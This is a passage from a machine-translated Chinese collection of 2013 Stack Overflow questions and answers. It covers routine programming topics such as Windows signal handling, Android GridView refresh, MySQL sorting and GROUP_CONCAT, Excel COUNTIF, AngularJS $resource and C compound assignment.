其次，除此之外的所有信号`SIGINT`都在引起该条件的同一线程上调用。这是因为 MSVCRT 使用 SEH 将这些信号作为第一次机会异常实现，并且 SEH 异常处理程序在同一线程上运行。这也意味着，如果您处理这样的 SEH（例如 Access Violation 映射到`SIGSEGV`），`EXCEPTION_CONTINUE_SEARCH`那么信号函数将不会被调用。

`SIGINT`另一方面，**在 Win32 上不受支持**。等效的功能是`SetConsoleCtrlHandler`，它总是在不同的线程上调用处理函数。如果您使用的 CRT（例如 MinGW、Cygwin 或 MSVCRT（如果可以）处理 SIGINT）将始终位于专门创建的线程上。

*   [http://msdn.microsoft.com/en-us/library/windows/desktop/ms683242(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms683242(v=vs.85).aspx)

如果它是仅 Windows 应用程序使用`SetConsoleCtrlHandler`和 SEH 代替。

如果您希望执行相当于向另一个进程发送信号的操作，您应该使用`GenerateConsoleCtrlEvent`.

最后，在信号处理程序中通常只有两件好事要做 - 要么退出（无论如何这是默认行为），或者将消息放在某种队列中以供以后处理（这是大多数高级语言所做的，因为一个简单的原因是，即使不在规范中，信号在行为上也是高度不可移植的，并且希望尽快离开处理程序。

# java - Eclipse 的 EMF

> ID：15879343
> 
> 赞同：0
> 
> 时间：2013-04-08T12:42:59.007
> 
> 标签：java, eclipse, emf

通过遵循本教程，我才刚刚开始学习 EMF：每个 Eclipse 开发人员都应该了解 EMF（Jonas Helming 和 Maximilian Koegel 撰写）

因此，我下载了一个更新以将 EMF 添加到我的 Eclipse。解压后的文件名为：

`emf-xsd-Update-2.8.3`

现在我该怎么做？如何在我的 IDE 上安装 EMF？

我如何向 IDE 指定它的存在？！

（我有一个供 Java 开发人员使用的 Eclipse IDE [Mac 上的 Juno] 以及 e2m）

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-13T09:24:04.427

您可以通过两种方式做到这一点：

1.  您将 EMF 作为一组 eclispe 插件（即 JAR 文件）下载，然后将它们放在 Eclipse 根目录的 plugins/ 或 dropins/ 目录下
2.  （最简单的方法）从 Eclipse 中，帮助 -> 安装新软件 -> [在此处选择可以安装 EMF 插件的更新站点]

在这里您可以找到 EMF 的更新站点：http: [//www.eclipse.org/modeling/emf/updates/](http://www.eclipse.org/modeling/emf/updates/)

您可能还想查看 EMF 安装 wiki 页面： [http ://wiki.eclipse.org/EMF/Installation](http://wiki.eclipse.org/EMF/Installation)

# android - 清除网格视图并在android中重新生成它

> ID：15879344
> 
> 赞同：1
> 
> 时间：2013-04-08T12:42:58.943
> 
> 标签：android, gridview, android-gridview

我在页面加载时有一个网格视图，它填充了它。当我单击它时，我有一个同步按钮，它应该重新生成网格视图。如何做到这一点。

我在用

`ImageAdapter adapter = new ImageAdapter(MainActivity.this); gridview.setAdapter(adapter);`

**代码详细**

```
try {
            if(stringArrayPdfUrlForLocalDB.length>0)
            {
                for(int i=0 ; i < stringArrayPdfUrlForLocalDB.length ; i++)
                {
                    String fileName = getOnlyFileName(stringArrayPdfUrlForLocalDB[i]);
                    String imageName = getImageName(stringArrayPdfUrlForLocalDB[i]);
                    String BookId   = stringArrayBookId[i];

                    //Toast.makeText(getApplicationContext(), "File Name: "+fileName+"\nBookId: "+BookId, Toast.LENGTH_LONG).show();

                    db.open();        
                    long id = db.insertRecord(BookId, fileName + ".pdf", imageName);        
                    db.close();
                }
            }
            else
            {
                Toast.makeText(getApplicationContext(), "Not getting any book form server.", Toast.LENGTH_SHORT).show();
            }

            //populate grid view

            ImageAdapter adapter = new ImageAdapter(MainActivity.this);
            gridview.setAdapter(adapter);

        } catch (Throwable e) {
            Toast.makeText(getApplicationContext(), ""+e, Toast.LENGTH_SHORT).show();
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:03:29.327

点击按钮后：

首先加载您的数据

之后就做。

```
adapter.notifyDataSetChanged(); 
```

* * *

**编辑：**

```
ImageAdapter adapter = new ImageAdapter(MainActivity.this); 
```

在执行该代码后创建此适配器到全局变量是：

```
adapter = new ImageAdapter(MainActivity.this);
gridview.setAdapter(adapter); 
```

在您的代码中更改此代码：

```
protected void onPostExecute(Double result) {
            // Toast.makeText(getApplicationContext(), responseBody,
            // Toast.LENGTH_SHORT).show();

            if (responseBody != null) {
                processResponce(responseBody);
            } else {
                Toast.makeText(getApplicationContext(), "Empty Responce.",
                        Toast.LENGTH_LONG).show();
            }

            adapter.notifyDataSetChanged();

        } 
```

# c# - 以编程方式在 MS Project .mpp 文件中添加列/自定义字段

> ID：15879348
> 
> 赞同：0
> 
> 时间：2013-04-08T12:43:19.197
> 
> 标签：c#, office-interop, ms-project

我正在使用以下代码以编程方式创建 .mpp 文件。这将创建一个带有默认字段（任务模式、任务名称、持续时间...）的 MS 项目文件。我想在这个新创建的文件中添加一个名为“MYCustom Field”的自定义列/字段。任何机构都可以指导我如何做到这一点。

```
Microsoft.Office.Interop.MSProject.Application projectApplication = new Microsoft.Office.Interop.MSProject.Application();

projectApplication.Visible = false;

Microsoft.Office.Interop.MSProject.Project ProjectSheet projectApplication.Projects.Add(missing, missing, missing);

projectApplication.ActiveProject.SaveAs("test.mpp", Microsoft.Office.Interop.MSProject.PjFileFormat.pjMPP, missing, missing); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T03:12:15.737

如果您仅使用 mpp 文件，则“添加自定义字段”意味着选择标准自定义字段之一：Text1-32、Duration1-..、Date1-..、Number1-..、Flag1-.. 取决于什么类型您的数据并将您自己的标签分配给该字段。

为此，您应该使用`Table.TableField.Add`方法。这是[MSDN 的链接](http://msdn.microsoft.com/en-us/library/office/office.vbapj.chm132642%28v=office.14%29.aspx)。表格是 MS Project 左侧的网格。

您可以重新定义可用的标准表之一，也可以`Application.Tables`使用`Application.TableCopy` `Application.TableApply`.

根据我的经验，关于 MS 项目编程的共同规则：尝试为您需要的东西找到专用对象，如果没有这样的对象 - 检查应用程序。

# java - 工具提示注册

> ID：15879350
> 
> 赞同：0
> 
> 时间：2013-04-08T12:43:22.607
> 
> 标签：java, swing, tooltip, registration

这句话是什么意思。

```
ToolTipManager.sharedInstance().registerComponent(jTree); 
```

我们是否也可以使用给定的语句注册超级组件，这样我们就不需要注册所有继承已注册超类的单个组件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:33:37.887

实际上，当我说 JTree 总是向管理器注册自己时我是错误的（就像 JTable 一样）：您必须手动完成*并*实现提供每个节点工具提示的自定义渲染器：

```
JTree tree = new JTree();
// need to register manually 
// (that is does _not_ automatically as f.i. JTable
// either register the tree
ToolTipManager.sharedInstance().registerComponent(tree);
// or set a not-null tooltip text to the tree
// tree.setToolTipText("default if node has none or outside node");
TreeCellRenderer r = new DefaultTreeCellRenderer() {

    @Override
    public Component getTreeCellRendererComponent(JTree tree,
            Object value, boolean sel, boolean expanded, boolean leaf,
            int row, boolean hasFocus) {
        super.getTreeCellRendererComponent(tree, value, sel, expanded, leaf,
                row, hasFocus);
        setToolTipText("I'm a leaf: " + leaf);
        return this;
    }

};
tree.setCellRenderer(r); 
```

# jakarta-ee - Java EE / jpa /jpql

> ID：15879351
> 
> 赞同：0
> 
> 时间：2013-04-08T12:43:23.417
> 
> 标签：jakarta-ee, jpa, jpql

我正在努力提高我在 Java EE 方面的技能

我尝试使用我在[这里找到的这个查询](http://www.objectdb.com/java/jpa/query/jpql/path)

```
SELECT COUNT(e) FROM Object e WHERE TYPE(e) <> Country 
```

我这样用

```
TypedQuery<String> query=(TypedQuery<String>) manager.createQuery
( "SELECT COUNT(e) FROM Object e WHERE TYPE(e) <> Country");
List list=query.getResultList();
for(Object entity : list)
System.out.println(entity); 
```

但我得到这个错误

```
Exception in thread "main" java.lang.IllegalArgumentException: org.hibernate.hql.ast.QuerySyntaxException: unexpected token: FROM near line 1, column 17 [SELECT COUNT(e) FROM Object e WHERE TYPE(e) <> Country]
at org.hibernate.ejb.AbstractEntityManagerImpl.convert(AbstractEntityManagerImpl.java:1374)
at org.hibernate.ejb.AbstractEntityManagerImpl.convert(AbstractEntityManagerImpl.java:1315)
at org.hibernate.ejb.AbstractEntityManagerImpl.createQuery(AbstractEntityManagerImpl.java:280) 
```

有人知道如何纠正吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:49:56.177

您的 typedQuery 的语法不正确。您不应该在 TypedQuery 中强制转换查询。

采用

```
 TypedQuery<FooBar> query = em.createQuery(MyQuery, FooBar.class); 
```

反而

见[http://www.objectdb.com/java/jpa/query/api](http://www.objectdb.com/java/jpa/query/api)

# c++ - 跳过不兼容的日食

> ID：15879352
> 
> 赞同：1
> 
> 时间：2013-04-08T12:43:24.417
> 
> 标签：c++, eclipse, path, mingw, libraries

我在eclipse上得到一个编译错误。

```
skipping incompatible C:\Users\khhwork\Desktop\test\test\Datastore\lib/libpq.dll when searching for -lpq 
```

我不知道为什么甚至如何能够将路径名中的最后一个 / 更改为 \ 。

我一直在更改和探索所有设置，但没有成功。

谢谢，凯文

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:51:33.953

Windows 应用程序使用的 Win32 API 都接受目录的 / 和 \ 分隔符，并且在编译时报告的错误看起来有些不同。您拥有的 libpq.dll 可能与您编译应用程序其余部分的平台不同（例如，您编译 64 位应用程序，而 DLL 是 32 位应用程序，或者相反，或者您是为另一个平台（如 ARM）编译，而 DLL 用于 x86 ......可以是这样的）。

# jquery - jquery cookie关闭按钮

> ID：15879355
> 
> 赞同：0
> 
> 时间：2013-04-08T12:43:29.543
> 
> 标签：jquery, wordpress, cookies

我在谷歌和这里做了很多关于使用 cookie 存储浏览器位置以及如果页面被刷新、返回等时能够返回到该位置的搜索，但我不确定如何询问正确的问题以获得我想做的事情。

坦率地说，我更像是一名设计师而不是一名开发人员。但是，当涉及到 jQuery 时，我确实具备基本技能。话虽如此，我正在寻找一种方法来关闭通过 ajax 加载的 Wordpress 帖子，这将使用户回到他们单击打开帖子时所在的页面位置。

我在一页上有几个帖子，我希望他们在关闭他们刚刚阅读的帖子后能够回到那个位置。我希望这有意义吗？

所以几乎是一个关闭按钮，一旦完成，用户就会返回到上一页位置。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:49:49.933

```
<a href="javascript:history.back(-1);">Go back</a> 
```

这将收回先前的位置。在 Chrome 和 Firefox 上测试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:49:57.773

不知道您的 wordpress 帖子是如何以 HTML 呈现的，解决此类问题的一般方法是将 x,y 坐标传递给您的关闭按钮（当用户单击链接以阅读帖子时）以及当用户单击时在关闭按钮上，您可以使用滚动功能 ( [https://developer.mozilla.org/en-US/docs/DOM/window.scroll](https://developer.mozilla.org/en-US/docs/DOM/window.scroll) ) 滚动到浏览器中的特定点。

# iphone - 如何获取实例变量名？

> ID：15879357
> 
> 赞同：0
> 
> 时间：2013-04-08T12:43:37.997
> 
> 标签：iphone, ios, ipad, uiview

我以编程方式创建了一个带有两个 UIButton 的简单 iPhone 屏幕，如下所示。

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    UIButton *buttonOne = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    buttonOne.frame = CGRectMake(60, 70, 200, 40);
    [buttonOne setTitle:@"One" forState:UIControlStateNormal];
    [self.view addSubview:buttonOne];

    UIButton *buttonTwo = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    buttonTwo.frame = CGRectMake(60, 250, 200, 40);
    [buttonTwo setTitle:@"Two" forState:UIControlStateNormal];
    [self.view addSubview:buttonTwo];
} 
```

现在按下标题为“One”的按钮时，我想将变量名设为“buttonOne”，类似地按下标题为“Two”的按钮时，我想将变量名设为“buttonTwo”。

我没有找到获取变量名的方法。有什么帮助吗？提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:05:52.487

首先，我想声明这不是好的编码风格。我假设您这样做是因为一些特殊/独特的情况，或者作为概念证明。在生产应用程序中，这不是要走的路。您应该将您的按钮设置为属性/变量，并且您可以在按下它们时比较它们，或者您可以分配标签，或者为每个按钮单独的目标/选择器。你能做的任何事情来避免这种方法都是好的，因为老实说这种方法有点糟糕（参见下一段末尾关于 nil/0 值的注释）。

您可以从之前的 SO 答案中查看下面的代码 - 它将返回给定指针的 ivar 的名称。但是，您必须将按钮声明为 ivars 而不是局部变量。此外，如果两个 ivars 为 nil，则报告相同。所以这只有在你所有的对象 ivars 都不是 nil 并且你的原始类型 ivars 不是 0 时才有效。

```
 #import <objc/objc.h>

- (NSString *)nameOfIvar:(id)ivarPtr
{
    NSString *name = nil;

    uint32_t ivarCount;
    Ivar *ivars = class_copyIvarList([self class], &ivarCount);

    if(ivars)
    {
        for(uint32_t i=0; i<ivarCount; i++)
        {
            Ivar ivar = ivars[i];

            id pointer = object_getIvar(self, ivar);
            if(pointer == ivarPtr)
            {
                name = [NSString stringWithUTF8String:ivar_getName(ivar)];            
                break;
            }
        }

        free(ivars);
    }

    return name;
} 
```

所以添加一个方法`buttonPressed:`如下：

```
- (void)buttonPressed:(id)sender {

     if ([sender isKindOfClass:[UIButton class]]) {

          NSString *buttonName = [self nameOfIvar:sender];
          //Now you can do something with your button name
     }
} 
```

第一个代码块的来源：[以字符串形式获取属性名称](https://stackoverflow.com/questions/6615826/get-property-name-as-a-string)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:55:16.833

通过这种方式buttonOne.titleLabel.text我们只能得到按钮标题名称。我们无法获得变量名

# machine-learning - 快速矿工：如何向数据集添加“标签”属性？

> ID：15879366
> 
> 赞同：7
> 
> 时间：2013-04-08T12:44:06.303
> 
> 标签：machine-learning, data-mining, decision-tree, rapidminer

我想将决策树学习算法应用于从 CSV 导入的数据集。问题是决策树块的“tra”输入仍然是红色的，说明“输入示例集必须具有特殊属性'label'。”。如何添加该标签？它是什么？我已经玩了一段时间没有结果。任何帮助表示赞赏。

附录：列的标题已被正确推断，所以我不知道“标签”是什么。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2014-01-28T12:35:29.147

当您在 RapidMiner 中导入数据时，在第 4 步中，您需要为要分类的列选择属性类型“标签”。

![将分类器列标记为](https://i.stack.imgur.com/LTemt.png)

单击底部的下一步按钮。

在第 5 步中，它会要求您保存导入文件，选择任何合适的名称，然后单击“完成”。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-04-08T14:09:30.070

标签是表示分类目标类的属性。“设置角色”运算符可以将属性设置为标签，但您可以在导入数据时这样做 - 大多数导入运算符都可以配置为设置属性的角色。“读取 CSV”就是其中之一。

# java - JTextArea 在 setWrapLine 时拉伸

> ID：15879373
> 
> 赞同：0
> 
> 时间：2013-04-08T12:44:24.923
> 
> 标签：java, jtextarea

我有以下代码：问题是当我运行应用程序时，包含这些组件的 JPanel 会因为 setLineWrap(true) 而伸展我已按照此处的建议将 JTextArea 插入到 JScrollPane 中 [http://docs.oracle.com/ javase/tutorial/uiswing/components/textarea.html](http://docs.oracle.com/javase/tutorial/uiswing/components/textarea.html) 但没有结果

```
titolo=new JLabel("title");
    text=new JTextArea("");
scrollPane = new JScrollPane(text);

    text.setLineWrap(true);

griglia=new GridBagLayout();
gbc=new GridBagConstraints();
setLayout(griglia);

buildConstraints(gbc,0,0,1,1,100,1);
griglia.setConstraints(titolo,gbc);

buildConstraints(gbc,0,1,1,1,100,100);
griglia.setConstraints(scrollPane,gbc);

add(titolo);
    add(scrollPane); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:53:57.493

在填充中检查[GridBagConstraint](http://docs.oracle.com/javase/6/docs/api/java/awt/GridBagConstraints.html#GridBagConstraints%28int,%20int,%20int,%20int,%20double,%20double,%20int,%20int,%20java.awt.Insets,%20int,%20int%29) **- 初始填充值**使用**GridBagConstraints.NONE**。

# c# - 高响应多线程 WPF 应用程序

> ID：15879375
> 
> 赞同：0
> 
> 时间：2013-04-08T12:44:39.787
> 
> 标签：c#, wpf, multithreading, backgroundworker

我正在开发 WPF 应用程序以通过串行端口与 16 个设备进行通信。通信过程包括读写命令。设备配置大约需要 2 分钟。我的 UI 应该在配置过程中响应，它应该在读取命令执行后显示读取，并在写入命令执行后显示命令状态。我使用 backgroundworker 来处理一台设备。一切正常。现在我需要同时运行所有 16 台设备。我该怎么做？由于只有一个 UI 线程可用，因此 2-3 台设备的 UI 挂起。请为此建议最好的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T14:17:32.393

您必须为每个设备配备后台 Worker，您可以通过以下方式报告每个设备的进度：

```
backgroundWorker1.DoWork += backgroundWorker1_DoWork;
backgroundWorker1.ProgressChanged +=backgroundWorker1_ProgressChanged;

   private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
     {
       ....
       backgroundWorker1.ReportProgress(i);
       ....
     }

  private void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
    {
       progressBar1.Value = e.ProgressPercentage;
    } 
```

您还可以使用以下方法从任何线程与 UI 线程交互：

```
Application.Current.Dispatcher.BeginInvoke
( DispatcherPriority.Normal,new Action(() => { ... })); 
```

# php - 使用 php 和 mysql 进行高级排序和搜索 mysql 数据库

> ID：15879380
> 
> 赞同：1
> 
> 时间：2013-04-08T12:44:46.753
> 
> 标签：php, mysql

我面临着一个独特的挑战。

我有一张包含 100 个号码的表格，名为 HUNDREDNUMBERS。我想选择最好的季度（75 到 100 个数字），并将它们放入另一个名为 BESTQUARTER 的表中。

我还想选择最差的季度（1 到 25 个数字），我想将它们放入另一个名为 WORSTQUARTER 的表中。

到目前为止，这是我的 Mysql 代码，

```
$Extract_Data = "
CREATE  TABLE $BESTQUARTER  
SELECT 
HUNDREDNUMBERS.number
FROM 
HUNDREDNUMBERS order by 
HUNDREDNUMBERS.number desc LIMIT 25 ";
$QuerySuccess =  mysql_query($Extract_Data, $connection); 
```

对于另一张桌子....

```
 $Extract_Data = "
 CREATE  TABLE $WORSTQUARTER  
 SELECT 
 HUNDREDNUMBERS.number
 FROM 
 HUNDREDNUMBERS order by 
 HUNDREDNUMBERS.number asc LIMIT 25 ";
 $QuerySuccess =  mysql_query($Extract_Data, $connection); 
```

问题是这个脚本每次都不是 100% 正确的。注意两个查询中的 ASC 和 DESC。这是一种尝试对数字进行排序的巧妙方法。

顺便说一句，HUNDREDNUMBERS 表中的一些数字有小数点。我需要两个新表 BESTQUARTER 和 WORSTQUARTER 中的数据进行进一步处理。

任何帮助是极大的赞赏

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:02:10.617

您正在进行字符串比较，并且这些比较遵循与数字数据类型不同的规则；我建议更改您的排序表达式：

```
ORDER BY CAST(HUNDREDNUMBERS.number AS UNSIGNED) DESC|ASC 
```

如果您需要分别支持负数或浮点数，`UNSIGNED`您也可以使用`SIGNED`or代替。`DECIMAL(M, N)`

或者（并且最好），您可以将`number`列更改为自行正确排序的类型；`VARCHAR`应该主要用于文本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:03:52.577

您应该检查数据类型。确保数字至少存储为小数。其他数据类型可能会导致排序关闭（这是一个很常见的错误）。看起来很简单，但是从我对问题的理解来看，您的代码实际上看起来是正确的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T12:55:14.217

如果您只有 100 个数字，我建议您创建一个带有排名的视图，并将其用于后续处理。使用中间表似乎有点矫枉过正：

```
select hn.*,
       (select count(*) from hundrednumbers hn2 where hn2.number <= hn.number
       ) as rank
from HundredNumbers hn 
```

使用索引`hundrednumbers(number)`，这甚至会有不错的表现。

您遇到的问题可能是原始数据中的重复项。如果是这样，查看排名可以帮助您弄清楚在这种情况下该怎么做。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-10T14:33:33.930

经过长时间的思考和测试，我相信我终于破解了它。

1）我将字段名“数字”更改为 DOUBLE UNSIGNED。（最初我使用的是 VARCHAR(50) ）

2) 每当您使用两个或多个具有相同字段名的表时，请在每个字段名前加上其表名。我这样做了，它奏效了，正如您将在下面的完整查询中看到的那样。

3) 原始数据多次出现相同的数字，即有多个值为100 的行实例。MySQL 仅将一个值为100 的行传输到表BESTQUARTER 中。（我不知道为什么）。

```
uniqueid    | id    | numbers   
1   200 100
2   6   100
3   76  100
4   64  99.009987655
5   10  95.98765432
6   11  11.98765432
7   12  25.12
8   13  53.173543
9   153 72.87676
10  32  99 
```

所以我添加了“GROUP By”并使用了 ID 字段。（注：“uniqueid”列为主键，“id”为唯一键，唯一标识每个数字）

这是新代码

```
create table BESTQUATER  
select 
HUNDREDNUMBERS.uniqueid , 
HUNDREDNUMBERS.id, 
HUNDREDNUMBERS.numbers
FROM 
HUNDREDNUMBERS
group by HUNDREDNUMBERS.id
ORDER BY HUNDREDNUMBERS.numbers  DESC  LIMIT 25 
```

# excel - 在 Excel 中计算每个国家/地区的公司数量

> ID：15879383
> 
> 赞同：0
> 
> 时间：2013-04-08T12:44:49.580
> 
> 标签：excel

我在同一个工作簿中有以下 2 个 excel 表：

公司：

```
 A          B
1 COMPANY   COUNTRY
2 Apple     USA
3 Microsoft USA
4 Samsung   Taiwan
5 Philips   Netherlands
6 Tulip     Netherlands 
```

国家：

```
 A             B
1 COUNTRY      NUM_COMP
2 USA          2*
3 Taiwan       1*
4 Netherlands  2* 
```

在工作表`countries`栏中`B`，我需要每个国家/地区的公司数量。我现在已经手动计算了它们，但是我需要一个单元格的公式来`B2`自动`B4`执行此操作，因为实际的工作表比这个示例要长得多。

谁能帮我？非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:52:54.470

函数'Countif'应该有帮助:)

> =COUNTIF(B:B;B2)

欢呼天空

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T13:20:23.137

对于每个国家/地区不同公司的数量，请尝试 B2 中的此公式

`=SUM(IF(FREQUENCY(IF(companies!B$2:B$2265=A2,MATCH(companies!A$2:A$2265,companies!A$2:A$2265,0)),ROW(companies!A$2:A$2265)-ROW(companies!A$2)+1),1))`

这是一个“数组公式”，需要使用 CTRL+SHIFT+ENTER 确认，以便像 { 和 } 这样的花括号出现在公式栏中的公式周围。

现在将公式复制到列

# mysql - SQL：3 个表（书、作者、书作者）

> ID：15879385
> 
> 赞同：8
> 
> 时间：2013-04-08T12:44:55.523
> 
> 标签：mysql, sql, join, concatenation

我的 MySQL 数据库中有 3 个表，它们具有以下结构：

书台：

```
 BOOK
---------------
book_id | title
---------------
   1    |   A
   2    |   B 
```

作者表：

```
 AUTHOR
----------------
author_id | name
----------------
     1    | John
     2    | Bush
     3    | Alex
     4    | Bob 
```

然后我有一个连接表，它在表 book 和 author 之间建立了多对多的关系，这意味着一本书可以由许多作者（即合着）写，一个作者可以有许多他或她写过。

```
 BOOK_AUTHOR
--------------------
book_id |  author_id
--------------------
   1    |     1
   1    |     2
   1    |     3
   1    |     4
   2    |     3
   2    |     4 
```

是否可以通过 SQL 或 MySQL 让 DBMS 输出如下内容：

```
 book_id |  title  |       authors
------------------------------------------
    1    |    A    | John, Bush, Alex, Bob
    2    |    B    | Alex, Bob 
```

输出中的作者行是与特定书籍关联的所有作者的串联。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-08T12:47:49.877

由于您正在使用`MySQL`，请使用`GROUP_CONCAT()`来连接每个组的行。

```
SELECT  a.Book_ID, 
        a.Title,
        GROUP_CONCAT(c.Name ORDER BY c.Name) Authors
FROM    Book a
        INNER JOIN book_author b
            ON a.Book_ID = b.Book_ID 
        INNER JOIn Author c
            ON b.Author_ID = c.Author_ID
GROUP   BY a.Book_ID, a.Title 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/01f9a/2)
*   [MySQL GROUP_CONCAT()](http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html#function_group-concat)

输出

```
╔═════════╦═══════╦════════════════════╗
║ BOOK_ID ║ TITLE ║      AUTHORS       ║
╠═════════╬═══════╬════════════════════╣
║       1 ║ A     ║ Alex,Bob,Bush,John ║
║       2 ║ B     ║ Alex,Bob           ║
╚═════════╩═══════╩════════════════════╝ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-04-27T22:26:02.107

这很好地解释了多对多关系和 3 个表如何从中提取数据。

最重要的是，我想为 Oracle 人员提供定制的解决方案 bcz Sql 和 Oracle 没有相同的语法，而且很难在网上找到......所以享受......

```
SELECT  book.BOOK_ID, book.BOOK_TITLE, 
listagg (CONCAT(CONCAT(author.AUTHOR_FIRSTNAME, ' '),author.AUTHOR_LASTNAME), ',') 
WITHIN GROUP 
(ORDER BY author.AUTHOR_FIRSTNAME) FirstName
FROM    Books book
        INNER JOIN authorbooks ab
            ON ab.BOOKS_ID = book.BOOK_ID
        INNER JOIN Authors author
            ON ab.Author_id = author.Author_ID
GROUP BY book.BOOK_ID, book.BOOK_TITLE; 
```

这将以良好的格式打印，包括名字和姓氏..

# angularjs - 如何在 AngularJS 控制器的 $scope 变量中记录/检查 $resource？

> ID：15879386
> 
> 赞同：0
> 
> 时间：2013-04-08T12:44:56.537
> 
> 标签：angularjs

在控制器中，当我从服务中获取资源时

```
$scope.myVariable = MyObject.get($scope.id); 
```

then`myVariable`未定义为 MyObject ，因为它将在稍后解决。有没有办法检查*控制器中*的变量（不在服务中），例如调试或日志记录？基本上我正在寻找类似的东西

```
console.log("myVariable now has property "+ $scope.myVariable.myProperty); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:54:38.217

从 AngularJS Doc 到[$resource](http://docs.angularjs.org/api/ngResource.%24resource)，你可以读到：

> 重要的是要意识到调用**$resource**对象方法会立即返回一个**空引用**。从服务器返回数据后，现有参考将填充实际数据。这是一个有用的技巧，因为通常将资源分配给模型，然后由视图呈现。拥有一个空对象不会导致渲染，一旦数据从服务器到达，那么该对象就会被数据填充，并且视图会自动重新渲染自身以显示新数据。**这意味着在大多数情况下不必为操作方法编写回调函数**。

**但是**，如果您需要`$scope.myVariable`在填充后打印 的值，则必须定义一个回调函数：

```
$scope.myVariable = MyObject.get($scope.id, function(myVar){
   // From now, myVar == $scope.myVariable
   console.log("myVariable now has property "+ myVar.myProperty);
}); 
```

# android - 用户单击按钮时可以以编程方式刷新 admob 吗？

> ID：15879387
> 
> 赞同：0
> 
> 时间：2013-04-08T12:45:01.187
> 
> 标签：android, request, admob, impressions

我有一个具有`prev`和`next`按钮的应用程序，并且我编写了代码，以便当用户单击`prev`或`next`按钮时会生成 admob 请求。

这样使用公平吗？还是违反了admob的规则？我在某处读到我们必须通过代码刷新它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T14:02:50.517

这不会为您带来更多收入，因为付款金额取决于 [每次查看的点击次数]。更多的刷新意味着更多的用户数据流量。我总是将其保留为默认刷新率。

# c - n/=10 和 n=n/10 的差异

> ID：15879388
> 
> 赞同：3
> 
> 时间：2013-04-08T12:45:03.303
> 
> 标签：c, microcontroller

执行速度之间`n/=10`有什么区别吗？`n=n/10`

就像`n--`并且`--n`在执行速度方面也有所不同......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T12:54:54.733

**不，不是真的：**

> `[C99: 6.5.16.2/3]:`形式的复合赋值`E1 op= E2`与简单赋值表达式的不同之处`E1 = E1 op (E2)`仅在于左值`E1`只计算一次。

因此，仅当您`n`是具有副作用的非平凡表达式（例如函数调用）时，这才会产生后果。

否则，我想理论上会涉及一个中间临时变量，但你必须非常不幸，这样一个临时变量才能在你编译的可执行文件中真正存在。您不会看到这两种方法之间的任何性能差异。

用基准确认这一点，并通过比较生成的程序集。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T12:59:17.730

给定以下 C 代码：

```
int f1(int n) {
   n /= 10;
   return n;
}

int f2(int n) {
   n = n / 10;
   return n;
} 
```

编译的`gcc -O4`结果基本上是

```
f1:
        movl    %edi, %eax
        movl    $1717986919, %edx
        sarl    $31, %edi
        imull   %edx
        sarl    $2, %edx
        subl    %edi, %edx
        movl    %edx, %eax
        ret

f2:
        movl    %edi, %eax
        movl    $1717986919, %edx
        sarl    $31, %edi
        imull   %edx
        sarl    $2, %edx
        subl    %edi, %edx
        movl    %edx, %eax
        ret 
```

我省略了一些样板文件，这些样板文件实际上是列表的一部分。

**在这种特定情况下，两种选择之间没有区别。**

根据使用的编译器、执行指令的实际环境和编译器优化级别，生成的代码可能会有所不同。但是您始终可以使用这种方法来检查生成的机器代码是否不同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T14:51:14.163

两者没有区别。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2013-04-08T13:13:57.470

我已经在 KEIL 交叉编译器中检查了这两个表达式和所需的相同执行时间：

```
=================================================
     5: x=x/5; 
     6:  
C:0x0005    EF       **MOV      A,R7**

C:0x0006    75F005   **MOV      B(0xF0),#0x05**

C:0x0009    84       **DIV      AB**

     7: x/=5; 

C:0x000A    75F005   **MOV      B(0xF0),#0x05**

C:0x000D    84       **DIV      AB**

C:0x000E    FF       **MOV      R7,A**

================================================ 
```

因此，没有任何区别，例如`--n`和`n--`。

# selenium - Selenium Webdriver - 当baseurl包含应用程序的IP地址时脚本没有运行

> ID：15879392
> 
> 赞同：4
> 
> 时间：2013-04-08T12:45:12.007
> 
> 标签：selenium, selenium-webdriver

我有以下代码：

```
driver = new FirefoxDriver();
baseUrl = "http://192.160.11.2:8081";
driver.get(baseUrl + "/");
driver.findElement(By.id("UserName")).clear();
driver.findElement(By.id("UserName")).sendKeys(ffsEmail); 
```

运行此代码时，将打开 Firefox 浏览器。但是如果不输入baseurl，它会在不运行代码的情况下关闭。

